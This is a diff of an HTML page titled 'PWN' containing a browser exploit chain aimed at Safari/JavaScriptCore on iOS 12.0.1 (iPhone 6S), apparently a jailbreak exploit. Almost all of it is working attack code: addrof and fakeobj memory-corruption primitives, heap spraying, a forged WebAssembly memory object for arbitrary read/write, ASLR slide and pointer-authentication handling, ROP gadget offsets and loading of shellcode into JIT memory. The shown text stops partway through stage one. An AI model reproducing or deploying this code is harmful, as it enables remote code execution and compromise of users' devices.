@@ -5,6 +5,7 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1, minumum-scale=1, maximum-scale=1, user-scalable=no">
 		<title>PWN</title>
 		<link rel="stylesheet" type="text/css" href="style.css"/>
+		<script type="text/javascript" src="offsets.js"></script>
 		<script type="text/javascript" src="utils.js"></script>
 		<script type="text/javascript" src="int64.js"></script>
 		<script type="text/javascript">
@@ -33,6 +34,36 @@
 			window.onload = function()
 			{
 
+				window.disableBtn = function()
+				{
+					setTimeout(function(){
+						var btn = document.querySelector("#btn");
+						btn.setAttribute('class','disabled');
+						btn.setAttribute('disabled','true');
+						btn.backup = btn.onclick;
+						btn.onclick = function(){};
+					}, 0.01);
+				};
+
+				window.enableBtn = function()
+				{
+					setTimeout(function(){
+						var btn = document.querySelector("#btn");
+						btn.setAttribute('class','disabled');
+						btn.removeAttribute('disabled');
+						btn.onclick = btn.backup;
+						btn.backup = undefined;
+					}, 0.01);
+				};
+
+				window.updateStatus = function(msg = '')
+				{
+					setTimeout(function(){
+						var btn = document.querySelector("#btn");
+						btn.innerText = msg;
+					}, 0.01);
+				};
+
 				SupportTarget("iPhone 6S", 12.01, "any"); // We currently only support the iPhone 6S on 12.0.1
 
 				if(!issupported()) // Mimic Obj-C button is disabled behaviour for unsupported devices
@@ -43,6 +74,8 @@
 					btn.onclick = function(){alert('Your device is not supported');};
 				}
 
+				assert_offsets();
+
 			};
 			
 
@@ -51,603 +84,577 @@
 			{
 
 				log.debug("Preparing exploit...\n");
-				u8_buffer.set(load_shellcode('shellcode.bin').u8,0x4000);
-				alert("First 32-bit value of shellcode: "+hexify(new Uint32Array(workbuf)[0x4000]));
+				u32_buffer.set(load_shellcode('shellcode.bin').u32, 0x4000);
+				alert("First 32-bit value of shellcode: "+hexify(u32_buffer[0x4000]));
 				var prestage = {
 					offsets: function()
 					{
-						
-						// Real dirty, this should be based off device detection, see utils.js
-						// The offsets here are from 12.0.1 iPhone 6S
-						return {
-					    	nativejitcode: 0x18887fb34, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
-					        vtable: 0x1B1C95058, 						// HTMLDivElement vtable from JavaScriptCore
-					        dlopen: 0x180923bb8, 						// From libdyld.dylib (For @5aelo's new mach-o approach)
-					        confstr: 0x18096fa10, 						// From libsystem_c.dylib (For @5aelo's new mach-o approach)
-					        disableprimitivegigacage: 0x1881CBF54, 				// From JavaScriptCore 
-					        g_gigacagebaseptrs: 0x1B80EC000, 				// From JavaScriptCore 
-					      	g_jsarraybufferpoison: 0x1B80F01A0, 				// From JavaScriptCore (For XOR with leaked buffer)
-					      	g_jitcodepoison: 0x1B80F0190, 					// From JavaScriptCore (For XOR with leaked code)
-					        g_typedarraypoisons: 0x0, 					// Removed as of iOS 11.4 
-					        startfixedmempool: 0x1BA0610C0, 				// From JavaScriptCore (For copying shellcode)
-					        endfixedmempool: 0x1BA0610C8, 					// From JavaScriptCore (For copying shellcode)
-					        jit_writeseperateheaps_func: 0x1BA0610D0,			// From JavaScriptCore (For detecting below i8)
-					        usefastpermissions_jitcopy: 0x1b80f0018,			// From JavaScriptCore (For detecting i8 and up)
-					        ptr_stack_check_guard: 0x1b9fa9a18,				// To make our JITMemCpy work
-					        dlsym: 0x180923d64,						// For our shellcode + linkage
-					        longjmp: 0x180adc598,					
-					        callbacks: 0x1b80f01a8,
-					        modelio_popx8: 0x18cda4cd8,					// For our Return Oriented Programming chain
-					        coreaudio_popx2: 0x18438dfec,
-					        jscbase: 0x188174000,						// _TEXT segment of JavaScriptCore
-					        linkcode_gadget: 0x188214890,					// From JavaScriptCore
-					        dyld_shared_cache: 0x180000000,					// Just so we can parse any mach-o and find gadgets
-					        thread_swap_mach_voucher: 0x180A5F2D0,				// From libsystem_kernel.dylib (For voucher_swap)
-					        task_set_mach_voucher: 0x180A5C0AC, 				// From libsystem_kernel.dylib (For voucher_swap)
-					        task_get_mach_voucher: 0x180A5BF64				// From libsystem_kernel.dylib (For voucher_swap)
-					};
-				}() // Behave like ANSI C's __attribute__((constructor))
-			}
-		return prestage;
-	};
 
-
-	// Our exploit memory primitives
-	var primitives = {
-
-		// Leaks the address of an object
-		addrof: function(obj)
-		{
-			var _addrof = function(val)
-			{
-				var array = [13.37];
-		    	var reg = /abc/y;
-		    
-			    function getarray() {
-			        return array;
-			    }
-		    
-			    // Target function
-			    var AddrGetter = function(array) {
-			        for (var i = 2; i < array.length; i++) {
-			            if (num % i === 0) {
-			                return false;
-			            }
-			        }
-			        
-			        array = getarray();
-			        reg[Symbol.match](val === null);
-			        return array[0];
-			    }
-		    
-			    // Force optimization
-			    for (var i = 0; i < 100000; ++i)
-			        AddrGetter(array);
-		    
-			    // Setup haxx
-			    regexLastIndex = {};
-			    regexLastIndex.toString = function() {
-			        array[0] = val;
-			        return "0";
-			    };
-		    	reg.lastIndex = regexLastIndex;
-		    
-			    // Do it!
-			    return AddrGetter(array);
-			};
-
-			for(i = 0; i < 100; i++)
-			{
-				var r = _addrof(obj);
-				if(typeof r != "object" && r !== 13.37)
-				{
-					return r;
+						return offsets[currentdevice.os.version][currentdevice.device[0]];
+					}() // Behave like ANSI C's __attribute__((constructor))
 				}
-			}
-			log.warn("Failed to leak address, we may crash...");
-			window.location.reload(); // Try again?
-		},
-
-		// Fakes anything to be an object we can operate on
-		fakeobj: function(val)
-		{
-			function _fakeobj(val) {
-			    var array = [13.37];
-			    var reg = /abc/y;
-			    
-			    function getarray() {
-			        return array;
-			    }
-			    
-			    // Target function
-			    var ObjFaker = function(array) {
-			        for (var i = 2; i < array.length; i++) {
-			            if (num % i === 0) {
-			                return false;
-			            }
-			        }
-			        
-			        array = getarray();
-			        reg[Symbol.match](val === null);
-			        array[0] = val;
-			    }
-			    
-			    // Force optimization
-			    for (var i = 0; i < 100000; ++i)
-			        ObjFaker(array);
-			    
-			    // Setup haxx
-			    regexLastIndex = {};
-			    regexLastIndex.toString = function() {
-			        array[0] = {};
-			        return "0";
-			    };
-			    reg.lastIndex = regexLastIndex;
-			    
-			    // Do it!
-			    var unused = ObjFaker(array);
-			    
-			    return array[0];
-			}
-			for (var i = 0; i < 1000; i++) {
-		    	var result = _fakeobj(val);
-		   		if (typeof result == "object"){
-		        	return result;
-		    	}
-			}
-		}
-	};
-
-	var	stage1 = function() {
-		// Spray Float64Array structures so that structure ID 0x5000 will
-	    // be a Float64Array with very high probability
-	    // We spray Float64Array first because it's faster
-	    var structs = [];
-	    for (var i = 0; i < 0x5000; i++) {
-	        var a = new Float64Array(1);
-	        a['prop' + i] = 1337;
-	        structs.push(a);
-	    }
-
-	    // Now spray WebAssembly.Memory
-	    for (var i = 0; i < 50; i++) {
-	        var a = new WebAssembly.Memory({inital: 0});
-	        a['prop' + i] = 1337;
-	        structs.push(a);
-	    }
-	    
-	   	// Our WASM module code
-    	var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
-   
-	   	// Convert the module to an arraybuffer
-	    var webAssemblyBuffer = str2ab(webAssemblyCode);
-
-	    //Assemble the Wasm module
-	    var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
-
-	    var jsCellHeader = new Int64([
-	        0x00, 0x50, 0x00, 0x00, // m_structureID
-	        0x0,                    // m_indexingType
-	        0x2c,                   // m_type
-	        0x08,                   // m_flags
-	        0x1                     // m_cellState
-	    ]);
-	    
-	    var wasmBuffer = {
-	        jsCellHeader: jsCellHeader.asJSValue(),
-	        butterfly: null,
-	        vector: null,
-	        memory: null,
-	        deleteMe: null
-	    };
-	    
-	    var wasmInternalMemory = {
-	        jsCellHeader: null,
-	        memoryToRead: {}, 
-	        sizeToRead: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
-	        size: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
-	        initialSize: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
-	        junk1: null,
-	        junk2: null,
-	        junk3: null,
-	        junk4: null,
-	        junk5: null,
-	    };
-	    
-	    var leaker = {
-	        objectToLeak: null
-	    };
-	    
-	    delete wasmBuffer.butterfly;
-	    delete wasmBuffer.vector;
-	    delete wasmBuffer.deleteMe;
-	    delete wasmInternalMemory.junk1;
-	    delete wasmInternalMemory.junk2;
-	    delete wasmInternalMemory.junk3;
-	    delete wasmInternalMemory.junk4;
-	    delete wasmInternalMemory.junk5;
-
-	    var realWasmMem = new WebAssembly.Memory({inital: 0x1});
-
-	    var wasmBufferRawAddr = primitives.addrof(wasmBuffer);
-	    var wasmBufferAddr = Add(Int64.fromDouble(wasmBufferRawAddr), 16);
-	    
-
-	    log.info("Fake Wasm Memory @ " + wasmBufferAddr);
-	    
-	    var fakeWasmBuffer = primitives.fakeobj(wasmBufferAddr.asDouble());
-	    while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
-	        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
-	        wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
-	    }
-	    
-	    var wasmMemRawAddr = primitives.addrof(wasmInternalMemory);
-	    var wasmMemAddr = Add(Int64.fromDouble(wasmMemRawAddr), 16);
-	    log.info("Fake Wasm Internal Memory @ " + wasmMemAddr);
-	    var wasmMem = primitives.fakeobj(wasmMemAddr.asDouble());
-	    
-	    wasmBuffer.memory = wasmMem;
-	    
-	    var importObject = {
-	        imports: {
-	            mem: fakeWasmBuffer
-	        }
-	    };
-
-	    function read_i64(readingFunc, offset) {
-	        var low = readingFunc(offset * 4);
-	        var midLow = readingFunc((offset * 4) + 1);
-	        var midHigh = readingFunc((offset * 4) + 2);
-	        var high = readingFunc((offset * 4) + 3);
-	        return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
-	    }
-	    
-	    function write_i64(writingFunc, offset, value) {
-	        writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
-	        writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
-	        writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
-	        writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
-	    }
-	    
-	    // Create writer from Object
-	    function createObjWriter(obj) {
-	        wasmInternalMemory.memoryToRead = obj;
-	        var module = new WebAssembly.Instance(webAssemblyModule, importObject);
-	        return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
-	    }
-	    
-	    var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
-	    var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
-	    
-	    // Create writer from address
-	    function createDirectWriter(address) {
-	        wasmInternalBufferWriter.write_i64(1, address);
-	        var module = new WebAssembly.Instance(webAssemblyModule, importObject);
-	        return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
-	    }
-	   // Now edit our real Wasm memory
-	    var realWasmWriter = createObjWriter(realWasmMem);
-	    var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
-
-	    log.info("Real Wasm Internal Memory @ " + realWasmInternalMemAddr);
-	    wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
-
-	    // Create an object leaker
-	    var leakerWriter = createObjWriter(leaker);
-	    
-	    // Set sizes to large values
-	    wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
-	    wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
-	    wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
-	    var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
-	    importObject.imports.mem = realWasmMem;
-
-		primitives.addrof = function(obj) {
-	        leaker.objectToLeak = obj;
-	        return leakerWriter.read_i64(2);
-	    };
-
-	    primitives.fakeobj = function(addr) {
-	        leakerWriter.write_i64(2, addr);
-	        return leaker.objectToLeak;
-	    };
-
-	     // And createObjWriter
-	    primitives.createObjWriter = function(obj) 
-	    {
-
-	       	return createDirectWriter(primitives.addrof(obj));
-	    };
-
-	    log.info("Cleaning up stage 1, this may take a while.");
-	    
-	    millis(100); // Sleep 100ms
-	    
-	    var writer = primitives.createObjWriter(wasmMem);
-	    writer.write_i64(0, Int64.One);
-
-	    var wasmBufferWriter = primitives.createObjWriter(wasmBuffer);
-	    var writer = primitives.createObjWriter(wasmInternalMemory);
-
-	    wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007')); // Don't know why this works, lol
-	    wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
-	    
-	    writer.write_i64(4, Int64.Zero);
-	    writer.write_i64(5, Int64.Zero);
-	    writer.write_i64(6, Int64.Zero);
-	    writer.write_i64(7, Int64.Zero);
-
-	    writer.write_i64(0, new Int64('0x0000000000000007'));
-	    writer.write_i64(2, new Int64('0x0000000000000007'));
-
-		millis(1000); // Seems more stable with 1 second sleep
-			    
-		log.info("Cleanup complete. Crafting primitives.");
-			  	
-		var newprimitives = {};
-	    newprimitives.create_writer = function(addrObj) {
-	        if (addrObj instanceof Int64) {
-	            var writer = createDirectWriter(addrObj);
-	            return writer;
-	        } else {
-	            var writer = createObjWriter(addrObj);
-	            return writer;
-	        }
-	    };
-	    newprimitives.read_i64 = function(addrObj, offset) {
-	            var writer = newprimitives.create_writer(addrObj);
-	            return writer.read_i64(offset);
-	    };
-	    newprimitives.write_i64 = function(addrObj, offset, value) {
-	        var writer = newprimitives.create_writer(addrObj);
-	        writer.write_i64(offset, value);
-	    };
-
-	    newprimitives.write_non_zero = function(where, values)
-	    {
-	    	for(var i = 0; i < values.length; ++i)
-	    	{
-	    		if(values[i] != 0)
-	    		{
-	    			newprimitives.write_i64(Add(where,i*8),0, values[i]);
-	    		}
-	    	}
-	    };
-
-	    newprimitives.read_i32 = function(addrObj, offset) {
-	        var writer = newprimitives.create_writer(addrObj);
-	        return new Int64(writer.read_i32(offset));
-	    };
-	    newprimitives.write_i32 = function(addrObj, offset, value) {
-	        var writer = newprimitives.create_writer(addrObj);
-	        writer.write_i32(offset, value);
-	    };
-	    newprimitives.read_i8 = function(addrObj, offset) {
-	        var writer = newprimitives.create_writer(addrObj);
-	        return writer.read_i8(offset);
-	    };
-	    newprimitives.write_i8 = function(addrObj, offset, value) {
-	        var writer = newprimitives.create_writer(addrObj);
-	        writer.write_i8(offset, value);
-	    };
-	    newprimitives.copyto = function(addrObj, offset, data, length) {
-	        var writer = newprimitives.create_writer(addrObj);
-	        for (var i = 0; i < length; i++) {
-	            writer.write_i8(offset + i, data[i]);
-	        }
-	    };
-	    newprimitives.copyfrom = function(addrObj, offset, length) {
-	        var writer = newprimitives.create_writer(addrObj);
-	        var arr = new Uint8Array(length);
-	        for (var i = 0; i < length; i++) {
-	            arr[i] = writer.read_i8(offset + i);
-	        }
-	        return arr;
-	    };
-	    newprimitives.addrof = window.primitives.addrof;
-	    newprimitives.fakeobj = window.primitives.fakeobj;
-	    log.info("Got stable Memory R/W");
-	    window.primitives = newprimitives;
-	    millis(100);
-	};
-
-
-	var stage2 = function(_off) 
-	{
-		var primitives = window.primitives;
-
-		/*
-		 * Function to see if the device has Control Flow Integrity (A12+)
-		*/
-    	var hasPAC = function() {
-	        var sinFuncAddr = primitives.addrof(Math.sin);
-	        var executableAddr = primitives.read_i64(sinFuncAddr, 3);
-	        var jitCodeAddr = primitives.read_i64(executableAddr, 3);
-	        var rxMemAddr = primitives.read_i64(jitCodeAddr, 4);
-	        if (ShiftRight(rxMemAddr, 5) == 0) {
-	            return false; //iOS Pointer from Shared Library cache without PAC
-	        }
-	        return true; // Must have PAC then, right?
-	    };
-
-	    if(hasPAC()){
-			log.info("Detected device with CFI.");
-		}
-		else
-		{
-			log.debug("Detected device without CFI.");
-		}
-
-		/*
-		 * Strip the Pointer Authentication Code from an address.
-		*/
-	    primitives.strippac = function(addr)
-	    {
-		    var _pac = hasPAC();
-	    	return _pac ? And(addr, new Int64('0xFFFFFFFF8')) : addr;
-	    };
-	
-		function getjitfunc()
-	    {
-		    var shf = makejitfunc();
-		    var shf_addr = primitives.addrof(shf);
-		    log.info("Shellcode function @ " + shf_addr);
-		    var shfx_addr = primitives.read_i64(shf_addr, 3);
-		    log.info("Executable instance @ "+ shfx_addr);
-		    var shfc_addr = primitives.read_i64(shfx_addr, 3);
-		    log.info("JITCode instance @ " + shfc_addr);
-		    var shf_xregion = primitives.read_i64(shfc_addr, 4);
-		    shf_xregion = primitives.strippac(shf_xregion);
-		    log.info("Executable region @ " + shf_xregion); 
-		    return [shf, shfc_addr, shf_xregion];
+			return prestage;
 		};
 
-		var shf = getjitfunc();
-		
-		// This element is the element we target for leaking randomization and execution
-		var wrapper = document.createElement('div');
-		var el = primitives.read_i64(wrapper, FPO);
-	   	log.info("Element @ 0x"+el);
 
-		var nativejitcode = primitives.read_i64(el, 0);
-		log.info("Got nativejitcode @ "+nativejitcode);
-		dyld_cache_slide(_off.nativejitcode, nativejitcode);
-		slide = dyld_cache_slide();
-		
-		log.info("Slide: "+ hexify(slide));
-		
-		var jitWriteSeparateHeapsFunctionAddr = slideaddr(_off.jit_writeseperateheaps_func);
-		var jitWriteSeparateHeapsFunction = primitives.read_i64(jitWriteSeparateHeapsFunctionAddr, 0);
-		var useFastPermisionsJITCopyAddr = slideaddr(_off.usefastpermissions_jitcopy);
-		var useFastPermisionsJITCopy = primitives.read_i64(useFastPermisionsJITCopyAddr, 0);
-		
-		if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) 
-	    {
-	    	log.info("Got an older device. We can use the legacy execution flow.");
-	    }
-	    else
-	    {
-	    	log.info("Got an iPhone 8 or up. We must use the modern execution flow.");
-	    }
+		// Our exploit memory primitives
+		var primitives = {
 
-		log.debug("Finding the executable memorypool.");
-		var startOfFixedExecutableMemoryPoolAddr = slideaddr(_off.startfixedmempool);
-	   	var endOfFixedExecutableMemoryPoolAddr = slideaddr(_off.endfixedmempool);
+			// Leaks the address of an object
+			addrof: function(obj)
+			{
+				var _addrof = function(val)
+				{
+					var array = [13.37];
+			    	var reg = /abc/y;
+			    
+				    function getarray() {
+				        return array;
+				    }
+			    
+				    // Target function
+				    var AddrGetter = function(array) {
+				        for (var i = 2; i < array.length; i++) {
+				            if (num % i === 0) {
+				                return false;
+				            }
+				        }
+				        
+				        array = getarray();
+				        reg[Symbol.match](val === null);
+				        return array[0];
+				    }
+			    
+				    // Force optimization
+				    for (var i = 0; i < 100000; ++i)
+				        AddrGetter(array);
+			    
+				    // Setup haxx
+				    regexLastIndex = {};
+				    regexLastIndex.toString = function() {
+				        array[0] = val;
+				        return "0";
+				    };
+			    	reg.lastIndex = regexLastIndex;
+			    
+				    // Do it!
+				    return AddrGetter(array);
+				};
 
-	   	var startOfFixedExecutableMemoryPool = primitives.read_i64(startOfFixedExecutableMemoryPoolAddr, 0);
-		var endOfFixedExecutableMemoryPool = Add(startOfFixedExecutableMemoryPool, (0x20000/2));
+				for(i = 0; i < 100; i++)
+				{
+					var r = _addrof(obj);
+					if(typeof r != "object" && r !== 13.37)
+					{
+						return r;
+					}
+				}
+				log.warn("Failed to leak address, we may crash...");
+				disableBtn();
+				window.location.reload(); // Try again?
+			},
 
-		var jscbase = slideaddr(_off.jscbase);
-		var disablePrimitiveGigacage = slideaddr(_off.disableprimitivegigacage);
+			// Fakes anything to be an object we can operate on
+			fakeobj: function(val)
+			{
+				function _fakeobj(val) {
+				    var array = [13.37];
+				    var reg = /abc/y;
+				    
+				    function getarray() {
+				        return array;
+				    }
+				    
+				    // Target function
+				    var ObjFaker = function(array) {
+				        for (var i = 2; i < array.length; i++) {
+				            if (num % i === 0) {
+				                return false;
+				            }
+				        }
+				        
+				        array = getarray();
+				        reg[Symbol.match](val === null);
+				        array[0] = val;
+				    }
+				    
+				    // Force optimization
+				    for (var i = 0; i < 100000; ++i)
+				        ObjFaker(array);
+				    
+				    // Setup haxx
+				    regexLastIndex = {};
+				    regexLastIndex.toString = function() {
+				        array[0] = {};
+				        return "0";
+				    };
+				    reg.lastIndex = regexLastIndex;
+				    
+				    // Do it!
+				    var unused = ObjFaker(array);
+				    
+				    return array[0];
+				}
+				for (var i = 0; i < 1000; i++) {
+			    	var result = _fakeobj(val);
+			   		if (typeof result == "object"){
+			        	return result;
+			    	}
+				}
+			}
+		};
 
-		var callbacks = primitives.read_i64(slideaddr(_off.callbacks), 0);
-		var g_gigacageBasePtrs = slideaddr(_off.g_gigacagebaseptrs);
+		var	stage1 = function() {
+			// Spray Float64Array structures so that structure ID 0x5000 will
+		    // be a Float64Array with very high probability
+		    // We spray Float64Array first because it's faster
+		    var structs = [];
+		    for (var i = 0; i < 0x5000; i++) {
+		        var a = new Float64Array(1);
+		        a['prop' + i] = 1337;
+		        structs.push(a);
+		    }
 
-    	    	var g_typedArrayPoisons = slideaddr(_off.g_jsarraybufferpoison);
-	    	var longjmp = slideaddr(_off.longjmp);
-	    	var dlsym = slideaddr(_off.dlsym);
-	    	var ptr_stack_chk_guard = slideaddr(_off.ptr_stack_check_guard);
-		var linkcode_gadget = slideaddr(_off.linkcode_gadget);
+		    // Now spray WebAssembly.Memory
+		    for (var i = 0; i < 50; i++) {
+		        var a = new WebAssembly.Memory({inital: 0});
+		        a['prop' + i] = 1337;
+		        structs.push(a);
+		    }
+		    
+		   	// Our WASM module code
+	    	var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
+	   
+		   	// Convert the module to an arraybuffer
+		    var webAssemblyBuffer = str2ab(webAssemblyCode);
 
-		log.info(''
-	        + '\nASLR Slide ' + hexify(slide) //dyld shared cache slide should be equal to the vtable infoleak minus the vtable offset
-	        + '\nJavaScriptCore base @ ' + (jscbase == slide ? "Offset missing" : hexify(jscbase))
-	        + '\ncallbacks @ ' + (callbacks == slide ? "Offset missing" : hexify(callbacks)) //callback vector
-	        + '\nlongjmp @ ' + (longjmp == slide ? "Offset missing" : hexify(longjmp)) //symbol
-	        + '\ndlsym @ ' + (dlsym == slide ? "Offset missing" : hexify(dlsym)) //dlsym symbol, used for referincing a symbol by string
-	        + '\ndisablePrimitiveGigacage @ ' + (disablePrimitiveGigacage == slide ? "Offset missing" : hexify(disablePrimitiveGigacage)) //symbol
-	        + '\ng_gigacageBasePtrs @ ' + (g_gigacageBasePtrs == slide ? "Offset missing" : hexify(g_gigacageBasePtrs)) //symbol
-	        + '\nlinkCode gadget @ ' + (linkcode_gadget == slide ? "Offset missing" : hexify(linkcode_gadget)) //symbol, used in stage2
-	        + '\njit_writeseperateheaps_func @ ' + (jitWriteSeparateHeapsFunctionAddr == slide ? "Offset missing" : hexify(jitWriteSeparateHeapsFunctionAddr))
-	        + '\nuseFastPermisionsJITCopy @ ' +  (useFastPermisionsJITCopyAddr == slide ? "Offset missing" : hexify(useFastPermisionsJITCopyAddr))
-	        + '\nstartfixedmempool @ ' + (startOfFixedExecutableMemoryPool == slide ? "Offset missing" : startOfFixedExecutableMemoryPool)
-	        + '\nendfixedmempool @ ' + (endOfFixedExecutableMemoryPool == slide ? "Offset missing" : hexify(endOfFixedExecutableMemoryPool))
-	        + '\nptr_stack_check_guard @ ' + (ptr_stack_chk_guard == slide ? "Offset missing" : hexify(ptr_stack_chk_guard))
-	    );
+		    //Assemble the Wasm module
+		    var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
 
-		var pop_x8 = slideaddr(_off.modelio_popx8);
-		log.info("pop_x8 gadget: "+hexify(pop_x8));
+		    var jsCellHeader = new Int64([
+		        0x00, 0x50, 0x00, 0x00, // m_structureID
+		        0x0,                    // m_indexingType
+		        0x2c,                   // m_type
+		        0x08,                   // m_flags
+		        0x1                     // m_cellState
+		    ]);
+		    
+		    var wasmBuffer = {
+		        jsCellHeader: jsCellHeader.asJSValue(),
+		        butterfly: null,
+		        vector: null,
+		        memory: null,
+		        deleteMe: null
+		    };
+		    
+		    var wasmInternalMemory = {
+		        jsCellHeader: null,
+		        memoryToRead: {}, 
+		        sizeToRead: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
+		        size: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
+		        initialSize: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), // Something large enough
+		        junk1: null,
+		        junk2: null,
+		        junk3: null,
+		        junk4: null,
+		        junk5: null,
+		    };
+		    
+		    var leaker = {
+		        objectToLeak: null
+		    };
+		    
+		    delete wasmBuffer.butterfly;
+		    delete wasmBuffer.vector;
+		    delete wasmBuffer.deleteMe;
+		    delete wasmInternalMemory.junk1;
+		    delete wasmInternalMemory.junk2;
+		    delete wasmInternalMemory.junk3;
+		    delete wasmInternalMemory.junk4;
+		    delete wasmInternalMemory.junk5;
 
-		var pop_x2 = slideaddr(_off.coreaudio_popx2);
-		log.info("pop_x2 gadget: "+hexify(pop_x2));
+		    var realWasmMem = new WebAssembly.Memory({inital: 0x1});
 
-		var buffer_addr = primitives.addrof(workbuf);
-		log.info("Shellcode buffer @ " +buffer_addr);
+		    var wasmBufferRawAddr = primitives.addrof(wasmBuffer);
+		    var wasmBufferAddr = Add(Int64.fromDouble(wasmBufferRawAddr), 16);
+		    
 
-		var shellcode_src = Add(buffer_addr, 0x4000);
-		log.info("Shellcode @ " + shellcode_src);
+		    log.info("Fake Wasm Memory @ " + wasmBufferAddr);
+		    
+		    var fakeWasmBuffer = primitives.fakeobj(wasmBufferAddr.asDouble());
+		    while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
+		        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
+		        wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
+		    }
+		    
+		    var wasmMemRawAddr = primitives.addrof(wasmInternalMemory);
+		    var wasmMemAddr = Add(Int64.fromDouble(wasmMemRawAddr), 16);
+		    log.info("Fake Wasm Internal Memory @ " + wasmMemAddr);
+		    var wasmMem = primitives.fakeobj(wasmMemAddr.asDouble());
+		    
+		    wasmBuffer.memory = wasmMem;
+		    
+		    var importObject = {
+		        imports: {
+		            mem: fakeWasmBuffer
+		        }
+		    };
 
-		var shellcode_dst = endOfFixedExecutableMemoryPool;
-		log.info("Shellcode target @ " + hexify(shellcode_dst));
+		    function read_i64(readingFunc, offset) {
+		        var low = readingFunc(offset * 4);
+		        var midLow = readingFunc((offset * 4) + 1);
+		        var midHigh = readingFunc((offset * 4) + 2);
+		        var high = readingFunc((offset * 4) + 3);
+		        return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
+		    }
+		    
+		    function write_i64(writingFunc, offset, value) {
+		        writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
+		        writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
+		        writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
+		        writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
+		    }
+		    
+		    // Create writer from Object
+		    function createObjWriter(obj) {
+		        wasmInternalMemory.memoryToRead = obj;
+		        var module = new WebAssembly.Instance(webAssemblyModule, importObject);
+		        return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
+		    }
+		    
+		    var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
+		    var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
+		    
+		    // Create writer from address
+		    function createDirectWriter(address) {
+		        wasmInternalBufferWriter.write_i64(1, address);
+		        var module = new WebAssembly.Instance(webAssemblyModule, importObject);
